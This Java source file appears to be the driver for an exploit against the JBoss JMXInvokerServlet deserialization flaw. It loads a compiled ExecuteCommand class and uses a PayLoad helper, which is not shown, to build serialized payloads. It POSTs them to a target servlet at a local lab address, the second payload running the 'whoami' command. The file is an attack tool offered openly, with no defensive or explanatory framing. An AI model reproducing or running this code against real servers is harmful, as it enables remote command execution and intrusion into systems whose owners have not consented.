import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class Main {




    public static byte[] readExcuteCommandClass(String filePath) throws  Exception{
        File file = new File(filePath);
        InputStream input = new FileInputStream(file);
        byte[] data = new byte[input.available()];
        input.read(data);
        return data;
    }


    public static void SendPayload(String url, byte[] postData) throws Exception{

        URL target_url = null;
        HttpURLConnection connection = null;
        InputStream inputStream = null;
        //send data
        try{
            target_url = new URL(url);
            connection = (HttpURLConnection) target_url.openConnection();
            connection.setRequestMethod("POST");
            //connection.setRequestProperty("accept", "*/*");
            //connection.setRequestProperty("Content-Type", "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation");
            //connection.setRequestProperty("connection", "Keep-Alive");

            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setUseCaches(false);

            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(postData);

            outputStream.flush();
            outputStream.close();
        }catch (Exception e){
            e.printStackTrace();
        }finally {
            if(connection != null){
                connection.disconnect();
            }
        }
        //read ret data
        try{
            inputStream = connection.getInputStream();
            BufferedReader responseReader;
            StringBuilder sb = new StringBuilder();
            String readLine;
            responseReader = new BufferedReader(new InputStreamReader(inputStream));
            while ((readLine = responseReader.readLine()) != null){
                sb.append(readLine).append("\n");
            }
            responseReader.close();
            System.out.println(sb.toString());
        }catch (Exception e){
            e.printStackTrace();
        }
    }



    public static void main(String[] args) throws Exception{
        System.out.println("Start Exploit....!");
        //System.out.print(System.getProperty("user.dir"));
        String filePathClass = ".\\out\\production\\DeserializeExploit\\ExecuteCommand.class";
        SendPayload("http://192.168.199.133:8080/invoker/JMXInvokerServlet", PayLoad.FirstPayload("Windows", readExcuteCommandClass(filePathClass)));
        SendPayload("http://192.168.199.133:8080/invoker/JMXInvokerServlet", PayLoad.CommandPayload("Windows", "whoami"));
    }
}
